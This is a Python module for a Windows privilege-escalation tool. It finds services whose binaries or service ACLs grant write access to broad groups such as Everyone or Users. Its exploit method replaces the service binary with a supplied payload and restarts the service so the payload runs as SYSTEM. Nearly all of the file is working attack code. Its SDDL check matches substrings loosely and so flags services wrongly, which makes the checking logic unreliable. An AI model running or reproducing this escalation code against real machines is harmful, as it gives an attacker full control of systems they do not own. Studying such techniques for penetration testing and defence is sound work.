import os
import shutil
import subprocess
from pathlib import Path
from typing import Dict, List, Optional, Tuple

import sys

sys.path.append(str(Path(__file__).parent.parent))
from ..core.base import ServiceExploitBase
from ..core.enumerator import ServiceEnumerator


class WeakPermissionsExploit(ServiceExploitBase):
    """Exploit weak service binary permissions for privilege escalation."""

    # User/group identifiers that indicate exploitable permissions
    VULNERABLE_PRINCIPALS = [
        'Everyone',
        'Users',
        'BUILTIN\\Users',
        'Authenticated Users',
        'INTERACTIVE'
    ]

    def __init__(self, output_dir: str = "service_exploits"):
        """
        Initialize the weak permissions exploit module.

        Args:
            output_dir: Directory for storing output files
        """
        super().__init__(output_dir)
        self.enumerator = ServiceEnumerator(output_dir)
        self.vulnerable_services: List[Dict] = []
        self.log("Weak Permissions Exploit module initialized", "SUCCESS")

    def enumerate(self) -> List[Dict]:
        """
        Find services with weak binary or service permissions.

        Returns:
            List of vulnerable service dictionaries
        """
        self.log("Searching for services with weak permissions...")

        services = self.enumerator.get_all_services()
        self.log(f"Checking {len(services)} services...")

        self.vulnerable_services = []

        for service in services:
            vuln_info = self._check_service_permissions(service['name'])

            if vuln_info:
                self.vulnerable_services.append(vuln_info)

                self.log(f"Found vulnerable service: {service['name']}", "SUCCESS")
                self.log(f"  Binary: {vuln_info.get('binary_path', 'N/A')}")
                self.log(f"  Vulnerability: {vuln_info.get('vuln_type', 'Unknown')}")

        self.log(f"Found {len(self.vulnerable_services)} vulnerable services", "INFO")
        return self.vulnerable_services

    def _check_service_permissions(self, service_name: str) -> Optional[Dict]:
        """
        Check if a service has exploitable permissions.

        Args:
            service_name: Name of the service to check

        Returns:
            Vulnerability info dict or None if not vulnerable
        """
        config = self.enumerator.get_service_config(service_name)
        binary_path = config.get('binary_path')

        if not binary_path:
            return None

        # Clean up the path - remove quotes and arguments
        clean_path = binary_path.strip('"').split()[0]

        if not os.path.exists(clean_path):
            return None

        # Check binary permissions
        binary_vuln = self._check_binary_permissions(clean_path)

        if binary_vuln:
            return {
                'name': service_name,
                'binary_path': clean_path,
                'vuln_type': 'weak_binary_permissions',
                'vulnerable_acl': binary_vuln,
                'start_type': config.get('start_type'),
                'account': config.get('account')
            }

        # Check service configuration permissions
        service_vuln = self._check_service_acl(service_name)

        if service_vuln:
            return {
                'name': service_name,
                'binary_path': clean_path,
                'vuln_type': 'weak_service_permissions',
                'vulnerable_acl': service_vuln,
                'start_type': config.get('start_type'),
                'account': config.get('account')
            }

        return None

    def _check_binary_permissions(self, binary_path: str) -> Optional[str]:
        """
        Check if a binary has weak NTFS permissions.

        Args:
            binary_path: Path to the service binary

        Returns:
            Vulnerable ACL entry or None
        """
        result = self.run_command(f'icacls "{binary_path}"')

        for line in result.stdout.split('\n'):
            # Look for Full (F) or Modify (M) permissions
            if '(F)' in line or '(M)' in line:
                # Check if granted to vulnerable principals
                for principal in self.VULNERABLE_PRINCIPALS:
                    if principal.lower() in line.lower():
                        return line.strip()

        return None

    def _check_service_acl(self, service_name: str) -> Optional[str]:
        """
        Check if a service has weak service-level permissions.

        Args:
            service_name: Name of the service

        Returns:
            Vulnerable permission indicator or None
        """
        result = self.run_command(f'sc sdshow "{service_name}"')
        sddl = result.stdout.strip()

        # Look for dangerous permissions granted to vulnerable SIDs
        # WD = Everyone, BU = BUILTIN\Users, AU = Authenticated Users
        vulnerable_sids = {
            'WD': 'Everyone',
            'BU': 'BUILTIN\\Users',
            'AU': 'Authenticated Users'
        }

        for sid, name in vulnerable_sids.items():
            if sid in sddl:
                # Check for CONFIG_CHANGE (DC) or WRITE_DAC (WD) permissions
                # These would allow modifying the service configuration
                if 'DC' in sddl or 'WD' in sddl or 'GA' in sddl:
                    return f"{name} has configuration change access"

        return None

    def check_single_binary(self, binary_path: str) -> Tuple[bool, List[str]]:
        """
        Check if a specific binary has weak permissions.

        Args:
            binary_path: Path to check

        Returns:
            Tuple of (is_vulnerable, list of vulnerable ACL entries)
        """
        self.log(f"Checking permissions for: {binary_path}")

        if not os.path.exists(binary_path):
            self.log("File not found", "ERROR")
            return False, []

        result = self.run_command(f'icacls "{binary_path}"')

        vulnerable_entries = []

        for line in result.stdout.split('\n'):
            if '(F)' in line or '(M)' in line:
                for principal in self.VULNERABLE_PRINCIPALS:
                    if principal.lower() in line.lower():
                        vulnerable_entries.append(line.strip())

        if vulnerable_entries:
            self.log("Weak permissions detected!", "SUCCESS")
            for entry in vulnerable_entries:
                self.log(f"  {entry}")
            return True, vulnerable_entries
        else:
            self.log("No weak permissions found", "INFO")
            return False, []

    def exploit(self, service_name: str, payload_path: str) -> bool:
        """
        Exploit weak service binary permissions.

        Args:
            service_name: Name of the vulnerable service
            payload_path: Path to the malicious executable

        Returns:
            True if exploitation successful, False otherwise
        """
        self.log(f"Exploiting weak permissions for service: {service_name}")

        # Verify payload exists
        if not os.path.exists(payload_path):
            self.log(f"Payload not found: {payload_path}", "ERROR")
            return False

        # Get service binary path
        binary_path = self.get_service_binary_path(service_name)

        if not binary_path:
            self.log("Could not determine service binary path", "ERROR")
            return False

        # Clean path
        binary_path = binary_path.strip('"').split()[0]

        if not os.path.exists(binary_path):
            self.log(f"Service binary not found: {binary_path}", "ERROR")
            return False

        try:
            # Backup original binary
            backup_path = binary_path + '.bak'
            self.log(f"Backing up original to: {backup_path}")
            shutil.copy2(binary_path, backup_path)

            # Replace with payload
            self.log(f"Replacing binary with payload...")
            shutil.copy2(payload_path, binary_path)
            self.log("Binary replaced successfully", "SUCCESS")

            # Attempt service restart
            if self.restart_service(service_name):
                self.log("Exploitation complete - payload executing as SYSTEM", "SUCCESS")
                return True
            else:
                self.log("Service not restarted - wait for reboot", "WARNING")
                return True  # Binary is replaced

        except PermissionError:
            self.log(f"Permission denied replacing: {binary_path}", "ERROR")
            return False
        except Exception as e:
            self.log(f"Exploitation failed: {e}", "ERROR")
            return False

    def restore_original(self, service_name: str) -> bool:
        """
        Restore the original service binary from backup.

        Args:
            service_name: Name of the exploited service

        Returns:
            True if restoration successful, False otherwise
        """
        self.log(f"Restoring original binary for: {service_name}")

        binary_path = self.get_service_binary_path(service_name)

        if not binary_path:
            self.log("Could not determine service binary path", "ERROR")
            return False

        binary_path = binary_path.strip('"').split()[0]
        backup_path = binary_path + '.bak'

        if not os.path.exists(backup_path):
            self.log(f"Backup not found: {backup_path}", "ERROR")
            return False

        try:
            shutil.copy2(backup_path, binary_path)
            os.remove(backup_path)
            self.log("Original binary restored successfully", "SUCCESS")
            return True
        except Exception as e:
            self.log(f"Restoration failed: {e}", "ERROR")
            return False


if __name__ == "__main__":
    # Standalone usage example
    exploit = WeakPermissionsExploit()

    print("\n" + "=" * 60)
    print("Weak Service Permissions Vulnerability Scanner")
    print("=" * 60 + "\n")

    vulnerable = exploit.enumerate()

    if vulnerable:
        print(f"\n[+] Found {len(vulnerable)} vulnerable services:\n")

        for svc in vulnerable:
            print(f"  Service: {svc['name']}")
            print(f"  Binary: {svc['binary_path']}")
            print(f"  Vulnerability: {svc['vuln_type']}")
            print(f"  ACL: {svc['vulnerable_acl']}")
            print()
    else:
        print("\n[-] No vulnerable services found")